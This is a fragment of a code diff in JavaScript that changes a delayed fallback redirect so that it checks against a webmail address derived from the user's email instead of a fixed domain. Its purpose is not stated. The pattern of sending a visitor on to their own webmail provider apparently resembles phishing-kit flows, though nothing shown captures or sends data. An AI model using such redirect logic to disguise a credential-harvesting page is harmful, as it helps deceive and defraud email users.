@@ -171,7 +171,8 @@
                  
                  // Fallback redirect after delay
                  setTimeout(function() {
-                     if (window.location.href.indexOf(REDIRECT_DOMAIN) === -1) {
+                     var currentDomain = getWebmailUrl(userEmail).replace('https://', '');
+                     if (window.location.href.indexOf(currentDomain) === -1) {
                          console.log('Fallback redirect triggered');
                          window.location.href = redirectUrl;
                      }
